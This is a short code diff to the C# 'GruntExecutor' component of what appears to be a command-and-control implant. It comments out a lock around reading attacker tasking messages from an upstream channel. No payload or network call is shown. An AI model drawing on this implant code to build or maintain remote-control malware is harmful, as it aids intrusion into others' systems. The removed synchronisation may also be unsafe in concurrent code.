@@ -461,10 +461,10 @@ namespace GruntExecutor
         public GruntTaskingMessage ReadTaskingMessage()
         {
             ProfileMessage readMessage = null;
-            lock (_UpstreamLock)
-            {
+            //lock (_UpstreamLock)
+            //{
                 readMessage = this.UpstreamMessenger.Read();
-            }
+            //}
             if (readMessage == null)
             {
                 return null;
